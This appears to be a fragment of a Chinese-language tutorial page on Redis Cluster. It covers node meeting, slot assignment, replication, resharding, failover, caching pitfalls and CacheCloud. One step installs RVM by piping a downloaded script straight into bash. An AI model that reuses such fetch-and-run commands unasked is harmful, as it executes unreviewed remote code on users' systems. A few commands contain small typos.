+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br></div></div><ol start="2"><li>meet</li></ol> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token comment">#cluster meet ip port</span>
+redis-cli -h <span class="token number">127.0</span>.0.1 -p <span class="token number">7000</span> cluster meet <span class="token number">127.0</span>.0.1 <span class="token number">7001</span>
+redis-cli -h <span class="token number">127.0</span>.0.1 -p <span class="token number">7000</span> cluster meet <span class="token number">127.0</span>.0.1 <span class="token number">7002</span>
+redis-cli -h <span class="token number">127.0</span>.0.1 -p <span class="token number">7000</span> cluster meet <span class="token number">127.0</span>.0.1 <span class="token number">7003</span>
+redis-cli -h <span class="token number">127.0</span>.0.1 -p <span class="token number">7000</span> cluster meet <span class="token number">127.0</span>.0.1 <span class="token number">7004</span>
+redis-cli -h <span class="token number">127.0</span>.0.1 -p <span class="token number">7000</span> cluster meet <span class="token number">127.0</span>.0.1 <span class="token number">7005</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><ol start="3"><li>指派槽</li></ol> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token function">mkdir</span> script
+<span class="token builtin class-name">cd</span> script/
+<span class="token function">cat</span> addslots.sh
+
+<span class="token assign-left variable">start</span><span class="token operator">=</span><span class="token variable">$1</span>
+<span class="token assign-left variable">end</span><span class="token operator">=</span><span class="token variable">$2</span>
+<span class="token assign-left variable">port</span><span class="token operator">=</span><span class="token variable">$3</span>
+<span class="token keyword">for</span> <span class="token for-or-select variable">slot</span> <span class="token keyword">in</span> <span class="token variable"><span class="token variable">`</span><span class="token function">seq</span> $<span class="token punctuation">{</span>start<span class="token punctuation">}</span> $<span class="token punctuation">{</span>end<span class="token punctuation">}</span><span class="token variable">`</span></span>
+<span class="token keyword">do</span>
+  <span class="token builtin class-name">echo</span> <span class="token string">&quot;slot:<span class="token variable">${slot}</span>&quot;</span>
+  redis-cli -p <span class="token variable">${port}</span> cluster addslots <span class="token variable">${slot}</span>
+<span class="token keyword">done</span>
+
+<span class="token function">sh</span> addslots.sh <span class="token number">0</span> <span class="token number">5461</span> <span class="token number">7000</span>
+<span class="token function">sh</span> addslots.sh <span class="token number">5462</span> <span class="token number">10922</span> <span class="token number">7001</span>
+<span class="token function">sh</span> addslots.sh <span class="token number">10923</span> <span class="token number">16383</span> <span class="token number">7002</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><ol start="4"><li>主从</li></ol> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token comment">#cluster replicate node-id</span>
+cluster nodes
+redis-cli -h <span class="token number">127.0</span>.0.1  -p <span class="token number">7003</span> cluster replicate <span class="token variable">${node-id-7000}</span>
+redis-cli -h <span class="token number">127.0</span>.0.1  -p <span class="token number">7004</span> cluster replicate <span class="token variable">${node-id-7001}</span>
+redis-cli -h <span class="token number">127.0</span>.0.1  -p <span class="token number">7005</span> cluster replicate <span class="token variable">${node-id-7002}</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><h4 id="官方工具安装"><a href="#官方工具安装" class="header-anchor">#</a> 官方工具安装</h4> <div class="custom-block warning"><p class="custom-block-title">WARNING</p> <p>Redis Cluster 在 5.0 之后取消了 ruby 脚本 redis-trib.rb 的支持（手动命令行添加集群的方式不变），集合到 redis-cli 里，避免了再安装 ruby 的相关环境</p> <p>All commands and features belonging to redis-trib.rb have been moved to redis-cli</p></div> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>redis-cli --cluster create --cluster-replicas <span class="token number">1</span> <span class="token number">127.0</span>.0.1:7000 <span class="token number">127.0</span>.0.1:7001 <span class="token number">127.0</span>.0.1:7002 <span class="token number">127.0</span>.0.1:7003 <span class="token number">127.0</span>.0.1:7004 <span class="token number">127.0</span>.0.1:7005
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h4 id="以下为-redis-cluster-5-0-之前的安装方式"><a href="#以下为-redis-cluster-5-0-之前的安装方式" class="header-anchor">#</a> 以下为 Redis Cluster 5.0 之前的安装方式</h4> <ol><li>安装 Ruby 环境</li></ol> <p>RVM 安装</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token comment">#安装GPG keys</span>
+gpg2 --recv-keys 409B6B1796C275462A1703113804BB82D39DC0E3 7D2BAF1CF37B13E2069D6956105BD0E739499BDB
+<span class="token comment">#安装 RVM</span>
+<span class="token function">curl</span> -sSL https://get.rvm.io <span class="token operator">|</span> <span class="token function">bash</span> -s stable
+<span class="token comment">#载入RVM环境</span>
+<span class="token builtin class-name">source</span> /etc/profile.d/rvm.sh
+<span class="token comment">#检查RVM是否安装好</span>
+rvm -v
+gem -v
+<span class="token comment">#列出已知的ruby版本</span>
+rvm list known
+<span class="token comment">#选择现有的rvm版本来进行安装</span>
+rvm <span class="token function">install</span> <span class="token number">2.7</span>
+<span class="token comment">#查询已安装的ruby</span>
+rvm list
+<span class="token comment">#卸载已安装的版本</span>
+rvm remove <span class="token punctuation">[</span>版本号<span class="token punctuation">]</span>
+<span class="token comment">#设置Ruby版本</span>
+rvm <span class="token number">2.0</span>.0 —default
+<span class="token comment">#更换Ruby源</span>
+gem sources
+gem sources -a http://mirrors.aliyun.com/rubygems/
+gem sources -r https://rubygems.org/
+gem sources -u
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br></div></div><p>源码安装</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>yum <span class="token function">install</span> zlib-devel openssl-devel
+<span class="token comment">#下载ruby</span>
+<span class="token function">wget</span> https://cache.ruby-lang.org/pub/ruby/2.3/ruby-2.7.1.tar.gz
+<span class="token comment">#安装ruby</span>
+<span class="token function">tar</span> -xvf ruby-2.7.1.tar.gz
+<span class="token builtin class-name">cd</span> ruby-2.7.1
+./configure --prefix<span class="token operator">=</span>/usr/local/ruby  --disable-install-rdoc
+<span class="token function">make</span>
+<span class="token function">make</span> <span class="token function">install</span>
+ruby -v
+<span class="token builtin class-name">cd</span> /usr/local/ruby
+<span class="token function">cp</span> bin/ruby /usr/local/bin
+<span class="token function">cp</span> bin/gem /usr/local/bin
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><div class="custom-block warning"><p class="custom-block-title">WARNING</p> <p>出现报错
+Directory .ext/rdoc already exists, but it looks like it isn't an RDoc directory.</p></div> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token comment">#不安装rdoc</span>
+./configure --disable-install-rdoc
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><ol start="2"><li>安装 redis</li></ol> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>gem <span class="token function">install</span> redis
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token comment">#安装rubygem redis</span>
+<span class="token function">wget</span> https://rubygems.org/downloads/redis-4.1.4.gem
+gem <span class="token function">install</span> -l redis-4.1.4.gem
+gem list --check redis gem
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><ol start="3"><li>安装 redis-trib.rb</li></ol> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token comment">#cp ${REDIS_HOME}/src/redis-trib.rb /usr/local/bin</span>
+<span class="token function">find</span> / -name redis-trib.rb
+<span class="token function">cp</span> /usr/local/redis/src/redis-trib.rb /usr/local/bin
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><ol start="4"><li>构建集群</li></ol> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>./redis-trib.rb create --replicas <span class="token number">1</span> <span class="token number">127.0</span>.0.1:7000 <span class="token number">127.0</span>.0.1:7001 <span class="token number">127.0</span>.0.1:7002 <span class="token number">127.0</span>.0.1:7003 <span class="token number">127.0</span>.0.1:7004 <span class="token number">127.0</span>.0.1:7005
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="扩容集群"><a href="#扩容集群" class="header-anchor">#</a> 扩容集群</h3> <ol><li>准备新节点</li></ol> <ul><li>集群模式</li> <li>配置和其他节点统一</li> <li>启动后是孤儿节点</li></ul> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token function">sed</span> <span class="token string">'s/7000/7006/g'</span> redis-7000.conf <span class="token operator">&gt;</span> redis-7006.conf
+<span class="token function">sed</span> <span class="token string">'s/7000/7007/g'</span> redis-7000.conf <span class="token operator">&gt;</span> redis-7007.conf
+redis-server redis-7006.conf
+redis-server redis-7007.conf
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><ol start="2"><li>加入集群</li></ol> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>redis-cli -p <span class="token number">7000</span> cluster meet <span class="token number">127.0</span>.0.1 <span class="token number">7006</span>
+redis-cli -p <span class="token number">7000</span> cluster meet <span class="token number">127.0</span>.0.1 <span class="token number">7007</span>
+redis-cli -p <span class="token number">7007</span> cluster replicate  <span class="token variable">${node-id-7006}</span>
+
+<span class="token comment">#加入集群-redis-trib.rb</span>
+<span class="token comment">#redis-trib.rb add-node new_host:new_port existing_host:existing_port --slave --master-id &lt;arg&gt;</span>
+<span class="token comment">#redis-trib.rb add-node 127.0.0.1:7006 127.0.0.1:7000</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>作用</p> <ul><li>为他迁移槽和数据实现扩容</li> <li>作为从节点负责故障转移</li></ul> <ol start="3"><li>迁移槽和数据</li></ol> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token comment">#Redis Cluster 5.0 之后使用</span>
+redis-cli --cluster reshard <span class="token number">127.0</span>.0.1:7000
+
+<span class="token comment">#Redis Cluster 5.0 之前使用</span>
+<span class="token comment">#redis-trib</span>
+redis-trib.rb reshard <span class="token number">127.0</span>.0.1:7000
+<span class="token number">4096</span>
+<span class="token variable">${node-id-7006}</span>
+all
+<span class="token function">yes</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><ul><li>槽迁移计划</li> <li>迁移数据</li> <li>添加从节点</li></ul> <h4 id="迁移数据"><a href="#迁移数据" class="header-anchor">#</a> 迁移数据</h4> <ol><li>对目标节点发送：<code>cluster setslot {slot} importing {sourceNodeId}</code>命令，让目标节点准备导入槽的数据</li> <li>对源节点发送：<code>cluster setslot {slot} migrating {targetNodeId}</code>命令，让源节点准备迁出槽的数据</li> <li>源节点循环执行<code>cluster getkeysinslot {slot} {count}</code>命令，每次获取 count 个属于槽的键</li> <li>在源节点上执行<code>migrate {targetIp} {targetPort} key 0 {timeout}</code>命令把指定 key 迁移</li> <li>重复执行步骤 3-4 直到槽下所有数据迁移到目标节点</li> <li>向集群内所有主节点发送<code>cluster setslot {slot} node {targetNodeId}</code>命令，通知槽分配给目标节点</li></ol> <h3 id="收缩集群"><a href="#收缩集群" class="header-anchor">#</a> 收缩集群</h3> <ul><li>下线迁移槽</li> <li>忘记节点</li> <li>关闭节点</li></ul> <p>Redis Cluster 5.0 之后使用</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>redis-cli --cluster reshard --cluster-from <span class="token variable">${node-id-7006}</span> --cluster-to <span class="token variable">${node-id-7000}</span> --cluster-slots <span class="token number">1365</span> <span class="token number">127.0</span>.0.1:7006
+redis-cli --cluster reshard --cluster-from <span class="token variable">${node-id-7006}</span> --cluster-to <span class="token variable">${node-id-7001}</span> --cluster-slots <span class="token number">1366</span> <span class="token number">127.0</span>.0.1:7006
+redis-cli --cluster reshard --cluster-from <span class="token variable">${node-id-7006}</span> --cluster-to <span class="token variable">${node-id-7002}</span> --cluster-slots <span class="token number">1365</span> <span class="token number">127.0</span>.0.1:7006
+
+<span class="token comment">#cluster forget {downNodeId}</span>
+redis-cli --cluster del-node <span class="token number">127.0</span>.0.1:7000 <span class="token variable">${node-id-7007}</span>
+redis-cli --cluster del-node <span class="token number">127.0</span>.0.1:7000 <span class="token variable">${node-id-7006}</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>Redis Cluster 5.0 之前使用</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token comment">#redis-trib</span>
+redis-trib.rb reshard --from <span class="token variable">${node-id-7006}</span> --to <span class="token variable">${node-id-7000}</span> --slots <span class="token number">1365</span> <span class="token number">127.0</span>.0.1:7006
+redis-trib.rb reshard --from <span class="token variable">${node-id-7006}</span> --to <span class="token variable">${node-id-7001}</span> --slots <span class="token number">1366</span> <span class="token number">127.0</span>.0.1:7006
+redis-trib.rb reshard --from <span class="token variable">${node-id-7006}</span> --to <span class="token variable">${node-id-7002}</span> --slots <span class="token number">1365</span> <span class="token number">127.0</span>.0.1:7006
+
+<span class="token comment">#cluster forget {downNodeId}</span>
+redis-trib.rb del-node <span class="token number">127.0</span>.0.1:7000 <span class="token variable">${node-id-7007}</span>
+redis-trib.rb del-node <span class="token number">127.0</span>.0.1:7000 <span class="token variable">${node-id-7006}</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h3 id="客户端路由"><a href="#客户端路由" class="header-anchor">#</a> 客户端路由</h3> <h4 id="moved-重定向"><a href="#moved-重定向" class="header-anchor">#</a> moved 重定向</h4> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>redis-cli -c -p <span class="token number">7000</span>
+cluster keyslot key
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h4 id="ask-重定向"><a href="#ask-重定向" class="header-anchor">#</a> ask 重定向</h4> <h4 id="smart-客户端"><a href="#smart-客户端" class="header-anchor">#</a> smart 客户端</h4> <ol><li>从集群中选一个可运行节点，使用<code>cluster slots</code>初始化槽和节点映射</li> <li>将<code>cluster slots</code>的结果映射到本地，为每个节点创建 JedisPool</li> <li>准备执行命令</li></ol> <h4 id="批量操作优化"><a href="#批量操作优化" class="header-anchor">#</a> 批量操作优化</h4> <ol><li>串行 mget</li> <li>串行 IO</li> <li>并行 IO</li> <li>hash_tag
+<table><thead><tr><th style="text-align:center;">方案</th> <th style="text-align:center;">优点</th> <th style="text-align:center;">缺点</th> <th style="text-align:center;">网络 IO</th></tr></thead> <tbody><tr><td style="text-align:center;">串行 mget</td> <td style="text-align:center;">编程简单 <br> 少量 keys 满足需求</td> <td style="text-align:center;">大量 keys 请求延迟严重</td> <td style="text-align:center;">O(keys)</td></tr> <tr><td style="text-align:center;">串行 IO</td> <td style="text-align:center;">编程简单 <br> 少量节点满足需求</td> <td style="text-align:center;">大量 node 延迟严重</td> <td style="text-align:center;">O(nodes)</td></tr> <tr><td style="text-align:center;">并行 IO</td> <td style="text-align:center;">采用并行特性<br> 延迟取决于最慢的节点</td> <td style="text-align:center;">编程复杂<br>超时定位问题难</td> <td style="text-align:center;">O(max_slow(node))</td></tr> <tr><td style="text-align:center;">hash_tag</td> <td style="text-align:center;">性能最高</td> <td style="text-align:center;">读写增加 tag 维护成本 tag 分布易出现数据倾斜</td> <td style="text-align:center;">O(1)</td></tr></tbody></table></li></ol> <h3 id="故障"><a href="#故障" class="header-anchor">#</a> 故障</h3> <h4 id="故障发现"><a href="#故障发现" class="header-anchor">#</a> 故障发现</h4> <ul><li>通过 ping/pong 消息实现故障发现：不需要 sentinel</li> <li>主观下线和客观下线</li></ul> <h4 id="主观下线"><a href="#主观下线" class="header-anchor">#</a> 主观下线</h4> <p>某个节点认为另一个节点不可用，&quot;偏见&quot;</p> <h4 id="客观下线"><a href="#客观下线" class="header-anchor">#</a> 客观下线</h4> <p>当半数以上持有槽的主节点都标记某节点主观下线</p> <h4 id="尝试客观下线"><a href="#尝试客观下线" class="header-anchor">#</a> 尝试客观下线</h4> <ul><li>通知集群内所有节点标记故障节点为客观下线</li> <li>通知故障节点的从节点触发故障转移流程</li></ul> <h4 id="故障恢复"><a href="#故障恢复" class="header-anchor">#</a> 故障恢复</h4> <ul><li><p>资格检查</p> <ul><li>每个从节点检查与故障主节点的断线时间</li> <li>超过 cluster-node-timeout * cluster-slave-validity-factor 取消资格</li> <li>cluster-slave-validity-factor:默认是 10</li></ul></li> <li><p>准备选举时间</p></li> <li><p>选举投票</p></li> <li><p>替换主节点</p> <ul><li>当前从节点取消复制变为主节点<code>slaveof no one</code></li> <li>执行 slusterDelSlot 撤销故障主节点负责的槽，并执行 clusterAddSlot 把这些槽分配给自己</li> <li>向集群广播自己的 pong 消息，表明已经替换了故障从节点</li></ul></li></ul> <h4 id="故障模拟"><a href="#故障模拟" class="header-anchor">#</a> 故障模拟</h4> <ol><li>kill -9 节点模拟宕机</li> <li>观察客户端故障恢复时间</li> <li>观察各个节点的日志</li></ol> <h3 id="常见问题-4"><a href="#常见问题-4" class="header-anchor">#</a> 常见问题</h3> <h4 id="集群完整性"><a href="#集群完整性" class="header-anchor">#</a> 集群完整性</h4> <ul><li>cluster-require-full-coverage 默认为 yes
+<ul><li>集群中 16384 个槽全部可用：保证集群完整性</li> <li>节点故障或者正在故障转移：(err) CLUSTERDOWN The cluster is down</li></ul></li> <li>大部分业务无法容忍，cluster-require-full-coverage 建议设置为 no</li></ul> <h4 id="带宽消耗"><a href="#带宽消耗" class="header-anchor">#</a> 带宽消耗</h4> <ul><li>官方建议：1000 个节点</li> <li>PING/PONG 消息</li> <li>不容忽视的带宽消耗</li></ul> <p>消息发送频率：节点发现和其他节点最后通信消息超过 cluster-node-timeout/2 时会直接发送 ping 消息</p> <p>消息数据量：slots 槽数组(2KB 空间)和整个集群 1/10 的状态数据(10 个节点状态数据约 1KB)</p> <p>节点部署的机器规模：集群分布的机器越多且每台机器划分的节点数越均匀，则集群内整体的可用带宽越高</p> <h4 id="优化"><a href="#优化" class="header-anchor">#</a> 优化</h4> <ul><li>避免&quot;大&quot;集群：避免多业务使用一个集群，大业务可以多集群</li> <li>cluster-node-timeout：带宽和故障转移速度的均衡</li> <li>尽量均匀分配到多机器上：保证高可用和带宽</li></ul> <h4 id="pub-sub-广播"><a href="#pub-sub-广播" class="header-anchor">#</a> Pub/Sub 广播</h4> <ul><li>问题：publish 在集群每个节点广播：加重带宽</li> <li>解决：单独&quot;走&quot;一套 Redis Sentinel</li></ul> <h4 id="数据倾斜"><a href="#数据倾斜" class="header-anchor">#</a> 数据倾斜</h4> <ul><li>数据倾斜：内存不均
+<ul><li>节点和槽分配不均
+<ul><li><code>redis-trib.rb info ip:port</code>查看节点、槽、键值分布</li> <li><code>redis-trib.rb rebalance ip:port</code>进行均衡(谨慎使用)</li></ul></li> <li>不同槽对应键值数量差异较大
+<ul><li>CRC16 正常情况下比较均匀</li> <li>可能存在 hash_tag</li> <li><code>cluster countkeysinslot {slot}</code>获取槽对应键值个数</li></ul></li> <li>包含 bigkey
+<ul><li>bigkey：例如大字符串、几百万的元素的 hash、set 等</li> <li>从节点：<code>redis-cli --bigkeys</code></li> <li>优化：优化数据结构</li></ul></li> <li>内存相关配置不一致
+<ul><li>hash-max-ziplist-value、set-max-intset-entries 等</li> <li>优化：定期&quot;检查&quot;配置一致性</li></ul></li></ul></li> <li>请求倾斜：热点
+<ul><li>热点 key：重要 key 或者 bigkey</li> <li>优化：
+<ul><li>避免 bigkey</li> <li>热键不要用 hash_tag</li> <li>当一致性不高时，可以用本地缓存 + MQ</li></ul></li></ul></li></ul> <h4 id="读写分离-2"><a href="#读写分离-2" class="header-anchor">#</a> 读写分离</h4> <ul><li>只读连接：集群模式的从节点不接受任何读写请求
+<ul><li>重定向到复制槽的主节点</li> <li><code>readonly</code>命令可以读：连接级别命令</li></ul></li> <li>读写分离：更加复杂
+<ul><li>同样的问题：复制延迟、读取过期数据、从节点故障</li> <li>修改客户端 :cluster slaves {nodeId}</li></ul></li></ul> <h4 id="数据迁移"><a href="#数据迁移" class="header-anchor">#</a> 数据迁移</h4> <ul><li>官方迁移：redis-trib.rb import
+<ul><li>只能从单机迁移到集群</li> <li>不支持在线迁移：source 需要停写</li> <li>不支持断点续传</li> <li>单线程迁移：影响速度</li></ul></li> <li>在线迁移：
+<ul><li>唯品会：redis-migrate-tool</li> <li>豌豆荚：redis-port</li></ul></li></ul> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>redis-trib.rb <span class="token function">import</span> --from <span class="token number">127.0</span>.0.1:6388 --copy <span class="token number">127.0</span>.0.1:7000
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h4 id="集群限制"><a href="#集群限制" class="header-anchor">#</a> 集群限制</h4> <ul><li>key 批量操作支持有限：例如 mget、mset 必须在一个 slot</li> <li>key 事务和 Lua 支持有限：操作的 key 必须在一个节点</li> <li>key 是数据分区的最小粒度：不支持 bigkey 分区</li> <li>不支持多个数据库：集群模式下只有一个 db 0</li> <li>复制只支持一层：不支持树形复制结构</li></ul> <p>Redis Cluster：满足容量和性能的扩展性，很多业务&quot;不需要&quot;</p> <ul><li>大多数时客户端性能会&quot;降低&quot;</li> <li>命令无法跨 节点使用：megt、keys、scan、flush、sinter 等</li> <li>Lua 和事务无法跨节点使用</li> <li>客户端维护更复杂：SDK 和应用本身消耗(例如更多的连接池)</li></ul> <p>很多场景 Redis Cluster 已经足够好</p> <h2 id="缓存"><a href="#缓存" class="header-anchor">#</a> 缓存</h2> <h3 id="好处和成本"><a href="#好处和成本" class="header-anchor">#</a> 好处和成本</h3> <h4 id="好处"><a href="#好处" class="header-anchor">#</a> 好处</h4> <ol><li>加速读写</li></ol> <p>通过缓存加速读写速度：CPU L1/L2/L3 Cache、Linux page Cache、Linux 加速硬盘读写、浏览器缓存、Ehcache 缓存数据库结果</p> <ol start="2"><li>降低后端负载</li></ol> <p>后端服务器通过前端缓存降低负载：业务端使用 Redis 降低后端 MySQL 负载等</p> <h4 id="成本"><a href="#成本" class="header-anchor">#</a> 成本</h4> <ol><li>数据不一致：缓存层和数据层有时间窗口不一致，和更新策略有关</li> <li>代码维护成本：多了一层缓存逻辑</li> <li>运维成本：例如 Redis Cluster</li></ol> <h4 id="使用场景"><a href="#使用场景" class="header-anchor">#</a> 使用场景</h4> <ol><li>降低后端负载：对高消耗的 SQL：join 结果集/分组统计结果缓存</li> <li>加速请求响应：利用 Redis/Memcache 优化 IO 响应时间</li> <li>大量写合并为批量写：如计数器先 Redis 累计再批量写 DB</li></ol> <h3 id="更新策略"><a href="#更新策略" class="header-anchor">#</a> 更新策略</h3> <ol><li>LRU/LFU/FIFO 算法剔除：例如 maxmemory-policy</li> <li>超时剔除：例如 expire</li> <li>主动更新：开发控制生命周期</li></ol> <h3 id="缓存粒度"><a href="#缓存粒度" class="header-anchor">#</a> 缓存粒度</h3> <ol><li>通用性：全量属性更好</li> <li>占用空间：部分属性更好</li> <li>代码维护：表面上全量属性更好</li></ol> <h3 id="缓存穿透"><a href="#缓存穿透" class="header-anchor">#</a> 缓存穿透</h3> <p>大量请求不命中</p> <h4 id="原因"><a href="#原因" class="header-anchor">#</a> 原因</h4> <ol><li>业务代码自身问题</li> <li>恶意攻击、爬虫等等</li></ol> <h4 id="如何发现"><a href="#如何发现" class="header-anchor">#</a> 如何发现</h4> <ol><li>业务的响应时间</li> <li>业务本身问题</li> <li>相关指标：总调用数、缓存层命中数、存储层命中数</li></ol> <h4 id="解决方法"><a href="#解决方法" class="header-anchor">#</a> 解决方法</h4> <ol><li>缓存空对象</li> <li>布隆过滤器拦截</li></ol> <h3 id="缓存雪崩"><a href="#缓存雪崩" class="header-anchor">#</a> 缓存雪崩</h3> <p>由于 cache 服务承载大量请求，当 cache 服务异常/脱机，流量直接压向后端组件(例如 DB)，造成级联故障</p> <h4 id="优化方案"><a href="#优化方案" class="header-anchor">#</a> 优化方案</h4> <ol><li>保证缓存高可用性</li></ol> <ul><li>个别节点、个别机器、甚至是机房</li> <li>例如 Redis Cluster、Redis Sentinel、VIP</li></ul> <ol start="2"><li>依赖隔离组件为后端限流</li> <li>提前演练：例如压力测试</li></ol> <h3 id="无底洞问题"><a href="#无底洞问题" class="header-anchor">#</a> 无底洞问题</h3> <p>参考：<a href="http://highscalability.com/blog/2009/10/26/facebooks-memcached-multiget-hole-more-machines-more-capacit.html" target="_blank" rel="noopener noreferrer">http://highscalability.com/blog/2009/10/26/facebooks-memcached-multiget-hole-more-machines-more-capacit.html<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <ul><li>更多的机器 更多的性能</li> <li>批量接口需求(mget,mset 等)</li> <li>数据增长与水平扩展需求</li></ul> <h4 id="优化-io"><a href="#优化-io" class="header-anchor">#</a> 优化 IO</h4> <ol><li>命令本身优化：例如慢查询 keys、hgetall bigkey</li> <li>减少网络通信次数</li> <li>降低接入成本：例如客户端长连接/连接池、NIO 等</li></ol> <h3 id="热点-key-的重建优化"><a href="#热点-key-的重建优化" class="header-anchor">#</a> 热点 key 的重建优化</h3> <p>热点 key + 较长的重建时间</p> <ol><li>减少缓存重建的次数</li> <li>数据尽可能一致</li> <li>减少潜在风险</li></ol> <h4 id="解决方案"><a href="#解决方案" class="header-anchor">#</a> 解决方案</h4> <ul><li>互斥锁(mutex key)</li> <li>永远不过期</li></ul> <h2 id="cachecloud"><a href="#cachecloud" class="header-anchor">#</a> CacheCloud</h2> <p>CacheCloud 提供一个 Redis 云管理平台：实现多种类型(Redis Standalone、Redis Sentinel、Redis Cluster)自动部署、解决 Redis 实例碎片化现象、提供完善统计、监控、运维功能、减少运维成本和误操作，提高机器的利用率，提供灵活的伸缩性，提供方便的接入客户端。</p> <h3 id="安装-2"><a href="#安装-2" class="header-anchor">#</a> 安装</h3> <h4 